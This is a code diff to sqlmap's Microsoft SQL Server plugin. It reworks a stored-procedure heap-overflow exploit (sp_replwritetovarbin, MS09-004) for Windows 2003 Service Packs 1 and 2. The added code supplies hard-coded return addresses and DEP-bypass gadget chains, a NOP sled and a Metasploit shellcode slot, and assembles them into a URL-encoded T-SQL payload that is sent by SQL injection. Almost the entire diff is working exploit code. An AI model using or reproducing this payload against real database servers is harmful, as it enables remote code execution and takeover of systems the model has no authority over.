@@ -24,6 +24,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 
+import binascii
 import os
 import time
 
@@ -593,22 +594,6 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
         inject.goStacked("EXEC master..xp_dirtree '%s'" % self.uncPath)
 
 
-    def overflowBypassDEP(self):
-        self.handleDep("C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Binn\sqlservr.exe")
-
-        if self.bypassDEP == False:
-            return
-        else:
-            warnMsg  = "sqlmap tried to add the expection for "
-            warnMsg += "'sqlservr.exe' within the registry, but will not "
-            warnMsg += "restart the MSSQLSERVER process to avoid denial "
-            warnMsg += "of service. The buffer overflow trigger could not "
-            warnMsg += "work, however sqlmap will give it a try. Soon "
-            warnMsg += "it will come a new MS09-004 exploit to "
-            warnMsg += "automatically bypass DEP."
-            logger.warn(warnMsg)
-
-
     def spHeapOverflow(self):
         """
         References:
@@ -617,83 +602,109 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
         """
 
         returns = {
-                    "2003": ( 2, "CHAR(0x77)+CHAR(0x55)+CHAR(0x87)+CHAR(0x7c)" ), # ntdll.dll:   0x7c8601bd -> 7508e877 (0x77e80857 it's a CALL ESI @ kernel32.dll)
-                    "2000": ( 4, "CHAR(0xdc)+CHAR(0xe1)+CHAR(0xf8)+CHAR(0x7c)" ), # shell32.dll: 0x7cf8e1ec 163bf77c -> (CALL ESI @ shell32.dll)
-                  }
-        retAddr = None
+                    # 2003 Service Pack 0
+                    "2003-0": ( "" ),
 
-        for version, data in returns.items():
-            sp      = data[0]
-            address = data[1]
+                    # 2003 Service Pack 1
+                    "2003-1": ( "CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)", "CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)" ),
+
+                    # 2003 Service Pack 2 updated at 12/2008
+                    "2003-2": ( "CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)" ),
+
+                    # 2003 Service Pack 2 updated at 09/2009
+                    #"2003-2": ( "CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)", "CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)" ),
+                  }
+        addrs = None
+
+        for versionSp, data in returns.items():
+            version, sp = versionSp.split("-")
+            sp          = int(sp)
 
             if kb.osVersion == version and kb.osSP == sp:
-                retAddr = address
+                addrs = data
 
                 break
 
-        if retAddr == None:
+        if addrs is None:
             errMsg  = "sqlmap can not exploit the stored procedure buffer "
             errMsg += "overflow because it does not have a valid return "
             errMsg += "code for the underlying operating system (Windows "
-            errMsg += "%s Service Pack %d" % (kb.osVersion, kb.osSP)
+            errMsg += "%s Service Pack %d)" % (kb.osVersion, kb.osSP)
             raise sqlmapUnsupportedFeatureException, errMsg
+
+        shellcodeChar = ""
+        hexStr        = binascii.hexlify(self.shellcodeString[:-1])
+
+        for hexPair in range(0, len(hexStr), 2):
+            shellcodeChar += "CHAR(0x%s)+" % hexStr[hexPair:hexPair+2]
+
+        shellcodeChar = shellcodeChar[:-1]
 
         self.spExploit = """
         DECLARE @buf NVARCHAR(4000),
         @val NVARCHAR(4),
         @counter INT
         SET @buf = '
-        declare @retcode int,
-        @end_offset int,
-        @vb_buffer varbinary,
-        @vb_bufferlen int
-        exec master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
+        DECLARE @retcode int, @end_offset int, @vb_buffer varbinary, @vb_bufferlen int
+        EXEC master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
         SET @val = CHAR(0x41)
         SET @counter = 0
         WHILE @counter < 3320
         BEGIN
-            SET @counter = @counter + 1
-            IF @counter = 411
-                BEGIN
-                /* Return address */
-                SET @buf = @buf + %s
+          SET @counter = @counter + 1
+          IF @counter = 411
+          BEGIN
+            /* pointer to call [ecx+8] */
+            SET @buf = @buf + %s
 
-                /* Nopsled */
-                SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
-                SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
-                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+            /* push ebp, pop esp, ret 4 */
+            SET @buf = @buf + %s
 
-                /* Metasploit shellcode stage 1 */
-                SET @buf = @buf + %s
+            /* push ecx, pop esp, pop ebp, retn 8 */
+            SET @buf = @buf + %s
 
-                /* Unroll the stack and return */
-                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
-                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
-                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
-                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
-                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
-                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
-                CHAR(0xc3)
+            /* Garbage */
+            SET @buf = @buf + CHAR(0x51)+CHAR(0x51)+CHAR(0x51)+CHAR(0x51)
 
-                SET @counter = @counter + 302
-                SET @val = CHAR(0x43)
-                CONTINUE
-            END
-            SET @buf = @buf + @val
+            /* retn 1c */
+            SET @buf = @buf + %s
+
+            /* retn 1c */
+            SET @buf = @buf + %s
+
+            /* anti DEP */
+            SET @buf = @buf + %s
+
+            /* jmp esp */
+            SET @buf = @buf + %s
+
+            /* jmp esp */
+            SET @buf = @buf + %s
+
+            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+
+            set @buf = @buf + CHAR(0x64)+CHAR(0x8B)+CHAR(0x25)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)
+            set @buf = @buf + CHAR(0x8B)+CHAR(0xEC)
+            set @buf = @buf + CHAR(0x83)+CHAR(0xEC)+CHAR(0x20)
+
+            /* Metasploit shellcode */
+            SET @buf = @buf + %s
+
+            SET @buf = @buf + CHAR(0x6a)+CHAR(0x00)+char(0xc3)
+            SET @counter = @counter + 302
+            SET @val =  CHAR(0x43)
+            CONTINUE
+          END
+          SET @buf = @buf + @val
         END
         SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''
         EXEC master..sp_executesql @buf
-        """ % (retAddr, self.shellcodeChar)
+        """ % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)
 
         self.spExploit = self.spExploit.replace("    ", "").replace("\n", " ")
         self.spExploit = urlencode(self.spExploit, convall=True)
